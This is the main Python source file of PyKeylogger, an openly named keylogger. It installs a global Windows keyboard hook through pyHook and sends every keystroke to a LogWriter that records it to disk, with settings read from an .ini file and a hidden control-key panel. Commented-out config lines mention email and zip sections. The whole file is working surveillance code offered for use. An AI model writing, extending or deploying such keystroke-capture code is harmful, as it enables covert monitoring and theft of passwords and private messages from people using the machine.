import pyHook
import time
import pythoncom
import sys
import imp
from optparse import OptionParser
import traceback
from logwriter import LogWriter
import version
#import ConfigParser
from configobj import ConfigObj
from validate import Validator
from controlpanel import PyKeyloggerControlPanel
from supportscreen import SupportScreen
import Tkinter, tkMessageBox

class KeyLogger:
    ''' Captures all keystrokes, calls LogWriter class to log them to disk
    '''
    def __init__(self): 
        
        self.ParseOptions()
        self.ParseConfigFile()
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if self.settings['General']['Hook Keyboard'] == True:
            self.hm.HookKeyboard()
        #if self.options.hookMouse == True:
        #    self.hm.HookMouse()
        
        self.lw = LogWriter(self.settings, self.cmdoptions) 
        self.panel = False

    def start(self):
        pythoncom.PumpMessages()


    def OnKeyboardEvent(self, event):
        '''This function is the stuff that's supposed to happen when a key is pressed.
        Calls LogWriter.WriteToLogFile with the keystroke properties.
        '''
        self.lw.WriteToLogFile(event)
        
        if event.Key == self.settings['General']['Control Key']:
            if not self.panel:
                self.lw.PrintDebug("starting panel\n")
                self.panel = True
                PyKeyloggerControlPanel(self.cmdoptions, self)
            #~ else:
                #~ print "not starting any panels"
            
        return True
    
    def stop(self):
        '''Exit cleanly.
        '''
        self.lw.stop()
        sys.exit()
    
    def ParseOptions(self):
        '''Read command line options
        '''
        parser = OptionParser(version=version.description + " version " + version.version + " (" + version.url + ").")
        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
        parser.add_option("-c", "--configfile", action="store", dest="configfile", help="filename of the configuration ini file. [default: %default]")
        parser.add_option("-v", "--configval", action="store", dest="configval", help="filename of the configuration validation file. [default: %default]")
        
        parser.set_defaults(debug=False, 
                            configfile="pykeylogger.ini", 
                            configval="pykeylogger.val")
        
        (self.cmdoptions, args) = parser.parse_args()
    
    def ParseConfigFile(self):
        '''Read config file options from .ini file.
        Filename as specified by "--configfile" option, default "pykeylogger.ini".
        Validation file specified by "--configval" option, default "pykeylogger.val".
        
        Give detailed error box and exit if validation on the config file fails.
        '''
        #~ self.config = ConfigParser.SafeConfigParser()
        #~ self.config.readfp(open(self.options.configfile))
        
        #~ self.settings = dict(self.config.items('general'))
        #~ self.settings.update(dict(self.config.items('email')))
        #~ self.settings.update(dict(self.config.items('logmaintenance')))
        #~ self.settings.update(dict(self.config.items('timestamp')))
        #~ self.settings.update(dict(self.config.items('zip')))
        #~ self.settings.update(self.options.__dict__) # add commandline options to our settings dict
        self.settings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)

        # validate the config file
        errortext="Some of your input contains errors. Detailed error output below.\n\n"
        val = Validator()
        valresult = self.settings.validate(val, preserve_errors=True)
        if valresult != True:
            for section in valresult.keys():
                if valresult[section] != True:
                    sectionval = valresult[section]
                    for key in sectionval.keys():
                        if sectionval[key] != True:
                            errortext += "Error in item \"" + str(key) + "\": " + str(sectionval[key]) + "\n"
            tkMessageBox.showerror("Errors in config file. Exiting.", errortext)
            sys.exit()
        
if __name__ == '__main__':
    def main_is_frozen():
        return (hasattr(sys, "frozen") or # new py2exe
                hasattr(sys, "importers") or # old py2exe
                imp.is_frozen("__main__")) # tools/freeze
    
    # Set this to False to get rid of the splash. 
    show_splash = True
    
    if main_is_frozen() and show_splash == True: #comment out this if statement block to remove support request
        root=Tkinter.Tk()
        root.geometry("100x100+200+200")
        warn=SupportScreen(root, title="Please Support PyKeylogger", rootx_offset=-20, rooty_offset=-35)
        root.destroy()
        del(warn)
    
    kl = KeyLogger()
    kl.start()
    
    #if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
    